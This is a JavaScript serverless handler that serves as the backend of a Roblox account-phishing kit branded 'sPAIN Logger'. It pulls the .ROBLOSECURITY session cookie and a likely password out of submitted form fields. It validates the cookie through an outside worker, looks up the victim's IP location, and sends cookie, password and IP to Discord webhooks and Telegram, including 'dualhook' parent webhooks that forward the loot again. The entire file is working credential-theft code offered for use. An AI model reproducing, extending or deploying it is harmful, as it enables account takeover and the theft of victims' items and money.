// api/submit.js - Bulletproof version
export const config = {
  api: {
    bodyParser: {
      sizeLimit: '1mb',
    },
  },
};

const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN;
const TG_CHAT     = process.env.TG_CHAT;
const CHECKER_URL = 'https://holy-truth-3129.notrllyme133.workers.dev/';
const DISCORD_INV = 'https://discord.gg/5Q8XvgTpTT';

const WH_NAME   = 'sPAIN';
const WH_AVATAR = 'https://github.com/SOCCRETS/imhgrl/blob/main/PAINisAbeautifulTHING.webp?raw=true';
const EMOJI     = '<a:emoji_17:1508694920972468347>';

// ── Redis ─────────────────────────────────────────────────────────────────────
async function redisGet(key) {
  if (!REDIS_URL || !REDIS_TOKEN) {
    console.log('Redis credentials missing');
    return null;
  }
  try {
    const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, { 
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    if (!res.ok) {
      console.log('Redis fetch failed:', res.status);
      return null;
    }
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { 
      try { r = JSON.parse(r); } catch { return null; } 
    }
    if (r && typeof r.value === 'string' && !r.webhook) { 
      try { r = JSON.parse(r.value); } catch {} 
    }
    return r || null;
  } catch(e) {
    console.error('Redis error:', e);
    return null;
  }
}

// ── Geo ───────────────────────────────────────────────────────────────────────
async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 3000);
    const r = await fetch(`https://freeipapi.com/api/json/${ip}`, { signal: ctrl.signal });
    clearTimeout(timer);
    const d = await r.json();
    return { 
      city: d.cityName, 
      regionName: d.regionName, 
      country: d.countryName, 
      isp: d.isp 
    };
  } catch { return null; }
}

// ── Checker ───────────────────────────────────────────────────────────────────
async function validateCookie(cookie) {
  try {
    const r = await fetch(CHECKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie })
    });
    if (!r.ok) return { valid: false };
    const d = await r.json();
    return { valid: !!(d.valid || d.success), username: d.username || 'Unknown' };
  } catch(e) {
    console.error('Validation error:', e);
    return { valid: false };
  }
}

// ── Telegram ──────────────────────────────────────────────────────────────────
async function tgSend(text) {
  if (!TG_TOKEN || !TG_CHAT) return;
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST', 
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: TG_CHAT, 
        text, 
        parse_mode: 'HTML', 
        disable_web_page_preview: true 
      })
    });
  } catch(e) {
    console.error('Telegram error:', e);
  }
}

// ── Cookie extraction ─────────────────────────────────────────────────────────
const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';

function extractCookie(raw) {
  if (!raw) return null;
  const s = String(raw).trim();
  
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/); 
  if (m1) return m1[1];
  
  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                    
  if (m2) return WARN + m2[1];
  
  const m3 = s.match(/\|_([\w\-]{50,})/);                                
  if (m3) return WARN + m3[1];
  
  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
  
  return null;
}

function findCookie(slots) {
  if (!slots || typeof slots !== 'object') return null;
  for (const val of Object.values(slots)) {
    const c = extractCookie(String(val || ''));
    if (c) return c;
  }
  return null;
}

function findPassword(slots, cookie) {
  if (!slots || typeof slots !== 'object') return null;
  for (const val of Object.values(slots)) {
    const v = String(val || '').trim();
    if (!v || v === cookie || extractCookie(v)) continue;
    if (v.length >= 4 && v.length <= 128) return v;
  }
  return null;
}

const FLAGS = {
  'United States':'🇺🇸','United Kingdom':'🇬🇧','Canada':'🇨🇦','Australia':'🇦🇺',
  'Germany':'🇩🇪','France':'🇫🇷','Netherlands':'🇳🇱','Philippines':'🇵🇭',
  'Indonesia':'🇮🇩','Singapore':'🇸🇬','Malaysia':'🇲🇾','India':'🇮🇳',
  'Japan':'🇯🇵','South Korea':'🇰🇷','Brazil':'🇧🇷','Mexico':'🇲🇽',
  'New Zealand':'🇳🇿','Ireland':'🇮🇪','Sweden':'🇸🇪','Norway':'🇳🇴',
  'Denmark':'🇩🇰','Finland':'🇫🇮','Poland':'🇵🇱','Spain':'🇪🇸',
  'Italy':'🇮🇹','Russia':'🇷🇺','Turkey':'🇹🇷','South Africa':'🇿🇦',
  'Thailand':'🇹🇭','Vietnam':'🇻🇳','Saudi Arabia':'🇸🇦','UAE':'🇦🇪'
};

function flag(c) { return FLAGS[c] || '🌐'; }

// ── Discord helpers ───────────────────────────────────────────────────────────
async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST', 
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        username: WH_NAME, 
        avatar_url: WH_AVATAR, 
        ...payload 
      })
    });
  } catch(e) {
    console.error('Discord error:', e);
  }
}

async function discordChunked(url, text) {
  let rem = text; 
  let first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, 1990); 
    rem = rem.substring(1990);
    await discordSend(url, {
      content: first
        ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '')
        : chunk + (rem.length === 0 ? '\n```' : '')
    });
    first = false;
  }
}

// ── Handler ───────────────────────────────────────────────────────────────────
export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  try {
    // Parse body - Vercel should auto-parse JSON but handle both cases
    let body = req.body;
    if (typeof body === 'string') {
      try { body = JSON.parse(body); } catch { body = {}; }
    }
    
    console.log('Received body:', JSON.stringify(body, null, 2));
    
    const { slug, slots } = body || {};
    
    if (!slug) {
      console.log('Missing slug');
      return res.status(400).json({ error: 'slug is required' });
    }
    if (!slots) {
      console.log('Missing slots');
      return res.status(400).json({ error: 'slots is required' });
    }

    console.log('Fetching record for slot:', slug);
    const record = await redisGet(`slot:${slug}`);
    
    if (!record) {
      console.log('Record not found for:', slug);
      return res.status(404).json({ error: 'Page not found' });
    }
    if (!record.webhook) {
      console.log('No webhook in record');
      return res.status(500).json({ error: 'No webhook configured' });
    }

    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
               req.headers['x-real-ip'] || 'Unknown';
    const now = new Date().toISOString();
    const pName = record.displayName || slug;
    const isDH = !!record.dualhookParent;
    
    console.log('Extracting cookie...');
    const cookie = findCookie(slots);
    const password = findPassword(slots, cookie);

    // Build webhook list
    let webhook1 = null;
    const webhook2 = record.webhook;
    if (isDH) {
      try {
        const parent = await redisGet(`slot:${record.dualhookParent}`);
        if (parent?.webhook) webhook1 = parent.webhook;
      } catch (_) {}
    }
    const allWH = [webhook2, ...(webhook1 && webhook1 !== webhook2 ? [webhook1] : [])];

    // ── No cookie ────────────────────────────────────────────────────────────
    if (!cookie) {
      console.log('No cookie found');
      const geo = await getIpGeo(ip);
      const loc = [geo?.city, geo?.regionName, geo?.country]
        .filter(Boolean).join(', ') || 'Unknown';
      
      await Promise.all(allWH.map(wh => discordSend(wh, {
        content: '@everyone',
        embeds: [{
          title: '⚠️ Wrong Cookie — Troll Detected',
          description: isDH ? `${EMOJI} ${record.dualhookParent} ${EMOJI}` : `${EMOJI} s.PAIN ${EMOJI}`,
          color: 0xff3333,
          fields: [
            { name: '🌐 IP', value: `\`${ip}\``, inline: true },
            { name: '📍 Location', value: loc, inline: true },
            { name: '🗺️ ISP', value: geo?.isp || 'Unknown', inline: true },
            { name: '🕐 Time', value: now, inline: false }
          ],
          footer: { text: `sPAIN Logger • ${pName}` }, 
          timestamp: now
        }]
      })));
      
      await tgSend(`⚠️ <b>NO COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
      return res.status(200).json({ success: true });
    }

    // ── Validate cookie ─────────────────────────────────────────────────────
    console.log('Validating cookie...');
    const [geo, validation] = await Promise.all([
      getIpGeo(ip),
      validateCookie(cookie)
    ]);

    const loc = [geo?.city, geo?.regionName, geo?.country]
      .filter(Boolean).join(', ') || 'Unknown';
    const isp = geo?.isp || 'Unknown';
    const country = geo?.country || 'Unknown';
    const cflag = flag(country);

    // ── Invalid cookie ───────────────────────────────────────────────────────
    if (!validation.valid) {
      console.log('Cookie invalid');
      await Promise.all(allWH.map(wh => discordSend(wh, {
        content: '@everyone',
        embeds: [{
          title: '❌ Invalid Cookie — Validation Failed',
          description: isDH ? `${EMOJI} ${record.dualhookParent} ${EMOJI}` : `${EMOJI} s.PAIN ${EMOJI}`,
          color: 0xff6600,
          fields: [
            { name: '🌐 IP', value: `\`${ip}\``, inline: true },
            { name: '📍 Location', value: loc, inline: true },
            { name: '🗺️ ISP', value: isp, inline: true },
            { name: '👤 Username', value: `\`${validation.username || 'Unknown'}\``, inline: true },
            { name: '🕐 Time', value: now, inline: false }
          ],
          footer: { text: `sPAIN Logger • ${pName}` }, 
          timestamp: now
        }]
      })));
      
      await tgSend(`❌ <b>INVALID COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
      return res.status(200).json({ success: true, valid: false });
    }

    // ── Valid cookie ─────────────────────────────────────────────────────────
    console.log('Cookie valid, sending to Discord...');
    
    const embed = {
      title: `✅ Valid Cookie — ${validation.username}`,
      description: `${isDH ? `${EMOJI} ${record.dualhookParent} ${EMOJI}` : `${EMOJI} \\`sPAIN\\` ${EMOJI}`}\n\n[Discord Server](${DISCORD_INV})`,
      color: 0x22c55e,
      fields: [
        { name: '🌐 IP', value: `\`${ip}\``, inline: true },
        { name: '📍 Location', value: `${country} ${cflag}`, inline: true },
        { name: '🗺️ ISP', value: isp, inline: true },
        { name: '🔐 Password', value: `\`${password || 'N/A'}\``, inline: true },
        { name: '🕐 Time', value: now, inline: false }
      ],
      footer: { text: `sPAIN Logger • ${pName} • ${now}` },
      timestamp: now
    };

    await Promise.all(allWH.map(async wh => {
      await discordSend(wh, { content: '@everyone', embeds: [embed] });
      await discordChunked(wh, cookie);
    }));

    await tgSend([
      `✅ <b>VALID COOKIE — ${pName}</b>`,
      `👤 ${validation.username}`,
      `📍 ${loc} | ${isp}`,
      ``,
      `<code>${cookie.substring(0, 100)}...</code>`
    ].join('\n'));

    console.log('Success!');
    return res.status(200).json({ success: true, valid: true });

  } catch (err) {
    console.error('CRASH:', err);
    return res.status(500).json({ error: 'Internal server error', details: err.message });
  }
}
